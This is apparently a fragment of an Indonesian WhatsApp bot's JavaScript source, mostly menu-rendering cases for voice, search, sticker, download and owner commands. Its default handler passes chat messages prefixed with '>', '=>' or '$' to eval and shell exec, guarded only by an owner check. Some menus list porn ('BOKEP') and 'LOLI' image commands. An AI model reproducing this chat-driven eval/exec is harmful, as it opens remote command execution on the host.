╠➤ 𝐆𝐄𝐓𝐏𝐈𝐂
╠➤ 𝐁𝐔𝐀𝐓𝐆𝐑𝐔𝐏
╠➤ 𝐊𝐀𝐋𝐊𝐔𝐋𝐀𝐓𝐎𝐑
╠➤ 𝐓𝐑𝐀𝐍𝐒𝐋𝐀𝐓𝐄
╠➤ 𝐆𝐄𝐓𝐍𝐀𝐌𝐄
╠➤ 𝐌𝐔𝐓𝐄
╠➤ 𝐁𝐀𝐍
╠➤ 𝐇𝐈𝐃𝐄𝐓𝐄𝐗𝐓
╠➤ 𝐓𝐀𝐆𝐀𝐋𝐋
╠➤ 𝐏𝐑𝐎𝐌𝐎𝐓𝐄
╠➤ 𝐃𝐄𝐌𝐎𝐓𝐄
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭`,
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break
//════════════════════════════//
case 'voicechanger': {
if (isBan) throw (from)

anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐕𝐎𝐈𝐂𝐄 ]══════⊱
╠➤ 𝐁𝐀𝐒𝐒
╠➤ 𝐁𝐋𝐎𝐖𝐈𝐍
╠➤ 𝐄𝐀𝐑𝐑𝐀𝐏𝐄
╠➤ 𝐃𝐄𝐄𝐏
╠➤ 𝐅𝐀𝐒𝐓
╠➤ 𝐅𝐀𝐓
╠➤ 𝐑𝐎𝐁𝐎𝐓
╠➤ 𝐒𝐋𝐎𝐖
╠➤ 𝐓𝐔𝐏𝐀𝐈
╠➤ 𝐍𝐈𝐆𝐇𝐂𝐎𝐑𝐄
╠➤ 𝐑𝐄𝐕𝐄𝐑𝐒𝐄
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭`,
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break
//════════════════════════════//
case 'asupanmata': {
if (isBan) throw (from)

anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐀𝐒𝐔𝐏𝐀𝐍 ]══════⊱
╠➤ 𝐀𝐒𝐔𝐏𝐀𝐍𝐔𝐊𝐓𝐇𝐘
╠➤ 𝐀𝐒𝐔𝐏𝐀𝐍𝐒𝐀𝐍𝐓𝐔𝐘
╠➤ 𝐀𝐒𝐔𝐏𝐀𝐍
╠➤ 𝐂𝐄𝐂𝐀𝐍-𝐌𝐀𝐋𝐀𝐘𝐒𝐈𝐀
╠➤ 𝐂𝐄𝐂𝐀𝐍-𝐈𝐍𝐃𝐎
╠➤ 𝐇𝐈𝐉𝐀𝐁𝐄𝐑
╠➤ 𝐁𝐎𝐊𝐄𝐏
╠➤ 𝐂𝐄𝐂𝐀𝐍
╠➤ 𝐂𝐄𝐂𝐀𝐍-𝐊𝐎𝐑𝐄𝐀
╠➤ 𝐂𝐄𝐂𝐀𝐍-𝐕𝐈𝐄𝐓𝐍𝐀𝐌
╠➤ 𝐂𝐄𝐂𝐀𝐍-𝐉𝐄𝐏𝐀𝐍
╠➤ 𝐂𝐄𝐂𝐀𝐍-𝐓𝐇𝐀𝐈
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭`,
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break
//════════════════════════════//
case 'searchmenu': {
if (isBan) throw (from)

anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐒𝐄𝐀𝐑𝐂𝐇 ]══════⊱
╠➤ 𝐏𝐋𝐀𝐘
╠➤ 𝐘𝐓𝐒
╠➤ 𝐆𝐈𝐌𝐀𝐆𝐄
╠➤ 𝐆𝐎𝐎𝐆𝐋𝐄
╠➤ 𝐏𝐈𝐍𝐓𝐄𝐑𝐄𝐒𝐓
╠➤ 𝐖𝐀𝐋𝐏𝐀𝐏𝐄𝐑
╠➤ 𝐖𝐈𝐊𝐈𝐏𝐄𝐃𝐈𝐀
╠➤ 𝐘𝐓𝐒𝐄𝐀𝐑𝐂𝐇
╠➤ 𝐑𝐈𝐍𝐆𝐓𝐎𝐍𝐄
╠➤ 𝐒𝐄𝐀𝐑𝐂𝐇𝐆𝐑𝐎𝐔𝐏𝐒
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭`,
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break
//════════════════════════════//
case 'stickermenu': {
if (isBan) throw (from)

anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐒𝐓𝐈𝐂𝐊𝐄𝐑 ]══════⊱
╠➤ 𝐀𝐓𝐓𝐏
╠➤ 𝐒
╠➤ 𝐓𝐎𝐈𝐌𝐆
╠➤ 𝐓𝐎𝐕𝐈𝐃𝐄𝐎
╠➤ 𝐓𝐎𝐆𝐈𝐅
╠➤ 𝐓𝐎𝐔𝐑𝐋
╠➤ 𝐓𝐎𝐕𝐍
╠➤ 𝐓𝐎𝐎𝐍𝐂𝐄
╠➤ 𝐓𝐎𝐌𝐏3
╠➤ 𝐄𝐌𝐎𝐉𝐈𝐌𝐈𝐗
╠➤ 𝐄𝐌𝐎𝐉𝐈𝐌𝐈𝐗2
╠➤ 𝐓𝐎𝐀𝐔𝐃𝐈𝐎
╠➤ 𝐄𝐁𝐈𝐍𝐀𝐑𝐘
╠➤ 𝐃𝐁𝐈𝐍𝐀𝐑𝐘
╠➤ 𝐒𝐓𝐘𝐋𝐄𝐓𝐄𝐗𝐓
╠➤ 𝐒𝐌𝐄𝐌𝐄
╠➤ 𝐒𝐒 [ 𝐔𝐫𝐥 ]
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭`,
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break
//════════════════════════════//
case 'cmdmenu': {
if (isBan) throw (from)

anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐂𝐌𝐃 ]══════⊱
╠➤ 𝐒𝐄𝐓𝐂𝐌𝐃
╠➤ 𝐋𝐈𝐒𝐓𝐂𝐌𝐃
╠➤ 𝐋𝐎𝐂𝐊𝐂𝐌𝐃
╠➤ 𝐃𝐄𝐋𝐂𝐌𝐃
╠➤ 𝐋𝐈𝐒𝐓𝐌𝐒𝐆
╠➤ 𝐆𝐄𝐓𝐌𝐒𝐆
╠➤ 𝐃𝐄𝐋𝐌𝐒𝐆
╠➤ 𝐀𝐃𝐃𝐌𝐒𝐆
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭`,
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break
//════════════════════════════//
case 'downloadmenu': {
if (isBan) throw (from)

anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 ]══════⊱
╠➤ 𝐏𝐈𝐍𝐓𝐄𝐑𝐄𝐒𝐓𝐃𝐋 [𝐔𝐫𝐥]
╠➤ 𝐘𝐓𝐌𝐏3 
╠➤ 𝐘𝐓𝐌𝐏4 
╠➤ 𝐆𝐄𝐓𝐌𝐔𝐒𝐈𝐂 
╠➤ 𝐆𝐄𝐓𝐕𝐈𝐃𝐄𝐎 
╠➤ 𝐌𝐄𝐃𝐈𝐀𝐅𝐈𝐑𝐄 [𝐔𝐫𝐥]
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭`,
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break
//════════════════════════════//
case 'ownermenu': {
if (isBan) throw (from)
anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐎𝐖𝐍𝐄𝐑 ]══════⊱
╠➤ 𝐑𝐄𝐀𝐂𝐓 [𝐄𝐦𝐨𝐣𝐢]
╠➤ 𝐋𝐄𝐀𝐕𝐄
╠➤ 𝐂𝐇𝐀𝐓 [𝐎𝐩𝐭𝐢𝐨𝐧]
╠➤ 𝐉𝐎𝐈𝐍 [𝐋𝐢𝐧𝐤]
╠➤ 𝐔𝐍𝐁𝐋𝐎𝐂𝐊 @𝐔𝐬𝐞𝐫
╠➤ 𝐁𝐋𝐎𝐂𝐊 @𝐔𝐬𝐞𝐫
╠➤ 𝐒𝐄𝐓𝐏𝐏𝐁𝐎𝐓 
╠➤ 𝐒𝐄𝐓𝐏𝐏𝐁𝐎𝐓 /𝐅𝐔𝐋𝐋
╠➤ 𝐓𝐀𝐊𝐄
╠➤ 𝐏𝐈𝐍𝐆
╠➤ 𝐂𝐑𝐄𝐀𝐓𝐎𝐑
╠➤ 𝐎𝐖𝐍𝐄𝐑
╠➤ 𝐃𝐄𝐋𝐄𝐓𝐄
╠➤ 𝐈𝐍𝐅𝐎𝐂𝐇𝐀𝐓
╠➤ 𝐐𝐔𝐎𝐓𝐄𝐃
╠➤ 𝐂𝐎𝐖𝐍𝐄𝐑
╠➤ 𝐋𝐈𝐒𝐓𝐆𝐂
╠➤ 𝐋𝐈𝐒𝐓𝐏𝐂
╠➤ 𝐋𝐈𝐒𝐓𝐎𝐍𝐋𝐈𝐍𝐄
╠➤ 𝐒𝐏𝐄𝐄𝐃𝐓𝐄𝐒𝐓
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭
`,
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}

break
//════════════════════════════//
case 'scraperimage': {
if (isBan) throw (from)

anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐒𝐂𝐑𝐀𝐏𝐄𝐑 ]══════⊱
╠➤ 𝐋𝐎𝐋𝐈
╠➤ 𝐖𝐈𝐁𝐔
╠➤ 𝐂𝐎𝐔𝐏𝐋𝐄
╠➤ 𝐂𝐎𝐅𝐅𝐄
╠➤ 𝐐𝐔𝐎𝐓𝐄𝐒𝐀𝐍𝐈𝐌𝐄
╠➤ 𝐁𝐔𝐋𝐋𝐘
╠➤ 𝐖𝐀𝐈𝐅𝐔
╠➤ 𝐂𝐔𝐃𝐃𝐋𝐄
╠➤ 𝐍𝐄𝐊𝐎
╠➤ 𝐂𝐑𝐘
╠➤ 𝐊𝐈𝐒𝐒
╠➤ 𝐇𝐔𝐆
╠➤ 𝐋𝐈𝐂𝐊
╠➤ 𝐀𝐖𝐎𝐎
╠➤ 𝐘𝐄𝐄𝐓
╠➤ 𝐁𝐈𝐓𝐄
╠➤ 𝐏𝐀𝐓
╠➤ 𝐊𝐈𝐋𝐋
╠➤ 𝐍𝐎𝐌
╠➤ 𝐏𝐎𝐊𝐄
╠➤ 𝐁𝐎𝐍𝐊
╠➤ 𝐖𝐈𝐍𝐊
╠➤ 𝐆𝐋𝐎𝐌𝐏
╠➤ 𝐒𝐌𝐔𝐆
╠➤ 𝐖𝐀𝐕𝐄
╠➤ 𝐒𝐌𝐈𝐋𝐄
╠➤ 𝐁𝐋𝐔𝐒𝐇
╠➤ 𝐂𝐑𝐈𝐍𝐆𝐄
╠➤ 𝐇𝐈𝐆𝐇𝐅𝐈𝐕𝐄
╠➤ 𝐃𝐀𝐍𝐂𝐄
╠➤ 𝐇𝐀𝐏𝐏𝐘
╠➤ 𝐇𝐀𝐍𝐃𝐇𝐎𝐋𝐃
╠➤ 𝐃𝐀𝐑𝐊𝐉𝐎𝐊𝐄
╠➤ 𝐌𝐄𝐌𝐄
╠➤ 𝐌𝐄𝐌𝐄2
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭`,
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break
//════════════════════════════//
case 'randomsound': {
if (isBan) throw (from)

anu = `
▬▭▬▭▬▭▬▭▬▬▭▬▭

◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
◎ 𝐎𝐰𝐧𝐞𝐫 ${botname}
◎ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 https://wa.me/6281528628870
◎ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 ${runtime(process.uptime())}
◎ 𝐒𝐞𝐥𝐚𝐦𝐚𝐭  ${salam}

▬▭▬▭▬▭▬▭▬▬▭▬▭

╔══════[ 𝐒𝐎𝐔𝐍𝐃 ]══════⊱
╠➤ 𝐒𝐎𝐔𝐍𝐃1
╠➤ 
╠➤ 
╠➤ 
╠➤ 
╠➤ 
╠➤ 𝐒𝐀𝐌𝐏𝐀𝐈
╠➤ 
╠➤ 
╠➤ 
╠➤ 
╠➤ 
╠➤ 𝐒𝐎𝐔𝐍𝐃 161
╚════[ ꪶ⸸⁹⁹⁹𝗣𝗨𝗧𝗥𝗔-𝗞𝗘𝗟𝗔𝗡𝗔⁹⁹⁹⸸ꫂ͢ ]══════⊱

▬▭▬▭▬▭▬▭▬▬▭▬▭
 
 https://www.instagram.com/raehan1986/?hl=id
 
▬▭▬▭▬▭▬▭▬▬▭▬▭
 ╭━━━━━━━━━━━━━━━━╾•
 │⃟•╾ ◎ ${timeJak}
 │⃟•╾ ◎ ${timeMak}
 │⃟•╾ ◎ ${timeJay}
 ╰━━━━━━━━━━━━━━━╯

▬▭▬▭▬▭▬▭▬▬▭▬▭`,
BossRaehan.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/60e2afbef5528557a9273.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞ㄚ卂ㄥㄥ`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`,
"thumbnailUrl": `https://telegra.ph/file/dbb1a0521d07b5eeb504c.jpg`
}}, caption: anu })
}
break
//════════════════════════════//
//════════════════════════════//
default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return anjay(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
anjay(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await anjay(evaled)
} catch (err) {
await anjay(String(err))}}
if (budy.startsWith('$')) {
if (!isCreator) return 
exec(budy.slice(2), (err, stdout) => {
if(err) return anjay(err)
if (stdout) return anjay(stdout)})}
//════════════════════════════//
//════════════════════════════//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('status@broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
BossRaehan.copyNForward(m.chat, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//════════════════════════════//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
